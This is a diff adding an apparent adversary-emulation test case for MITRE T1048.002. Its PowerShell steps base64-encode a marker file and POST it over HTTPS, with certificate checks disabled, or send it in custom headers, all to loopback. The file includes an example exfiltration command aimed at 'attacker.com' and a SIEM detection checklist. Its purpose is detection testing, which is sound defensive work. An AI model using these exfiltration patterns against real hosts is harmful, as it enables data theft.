@@ -1,0 +1,100 @@
+id: T1048.002_exfiltration_over_alternative_protocol_asymmetric_encrypted
+name: "Exfiltration Over Alternative Protocol — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+mitre_technique: "T1048.002"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data over asymmetrically encrypted protocols (HTTPS/TLS)
+  separate from their C2 channel. Common methods: Invoke-WebRequest POST to a
+  legitimate-looking HTTPS endpoint, SFTP with RSA key authentication, or custom
+  TLS connections. HTTPS traffic blends with legitimate web traffic, making content
+  inspection harder without TLS inspection. Data may be base64-encoded in HTTP
+  request bodies, embedded in HTTP headers, or disguised as legitimate API calls.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1048/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1048.002 — Asymmetric Encrypted (HTTPS) Exfiltration simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate HTTPS POST exfiltration — data in body"
+    command: |
+      $dataPath = "$env:TEMP\PAS_T1048_002_payload.txt"
+      "PAS-T1048.002-HTTPS-EXFIL-PAYLOAD-$(Get-Date -Format o)|COMPUTERNAME=$env:COMPUTERNAME" |
+          Set-Content $dataPath
+
+      $encoded = [Convert]::ToBase64String(
+          [IO.File]::ReadAllBytes($dataPath))
+      Write-Host "[PAS] Payload encoded: $($encoded.Length) chars base64"
+
+      # HTTPS POST to loopback (simulates exfil to attacker HTTPS endpoint)
+      try {
+          [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+          $req = [System.Net.WebRequest]::Create("https://127.0.0.1:443/collect")
+          $req.Method = "POST"
+          $req.ContentType = "application/json"
+          $req.Timeout = 500
+          $body = [Text.Encoding]::UTF8.GetBytes("{`"d`":`"$encoded`"}")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream()
+          $s.Write($body, 0, $body.Length)
+          $s.Close()
+          $req.GetResponse() | Out-Null
+          Write-Host "[PAS] HTTPS POST to 127.0.0.1:443/collect — connection established"
+      } catch {
+          Write-Host "[PAS] HTTPS POST to loopback attempted (no HTTPS listener — expected)"
+      }
+      Write-Host "[PAS] Asymmetric encrypted exfil pattern generated"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate data embedded in HTTP headers — alternate method"
+    command: |
+      Write-Host "[PAS] Data-in-headers exfil pattern:"
+      Write-Host "[PAS] Real: Invoke-WebRequest -Uri https://attacker.com/beacon -Headers @{'X-Data'='<encoded_data>'}"
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/api/v1/status")
+          $req.Headers.Add("X-Client-Data", "PAS_T1048_002_HEADER_EXFIL")
+          $req.Headers.Add("X-Session", [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("exfil")))
+          $req.Timeout = 300
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Header-embedded exfil pattern generated"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HTTPS POST with large base64 body to unknown destination, non-standard HTTP headers"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1048_002_payload.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] HTTPS exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1048.002 cleanup complete"
+
+analyst_checklist:
+  - "Network event: HTTPS POST to unknown IP/domain with large request body"
+  - "Network event: HTTPS to IP address (no hostname) — certificate mismatch indicator"
+  - "Sentinel: DeviceNetworkEvents | where RemotePort == 443 and ActionType == 'ConnectionSuccess' and RemoteIPType == 'Public' and InitiatingProcessFileName == 'powershell.exe'"
+  - "DLP: TLS inspection at proxy required to inspect HTTPS POST body content"
+  - "MDE alert: 'HTTPS exfiltration to unknown destination'"
+  - "CONTROL CHECK: TLS inspection at egress proxy — enables DLP on HTTPS traffic"
+  - "CONTROL CHECK: Certificate pinning — flag HTTPS connections to IP addresses (no hostname)"
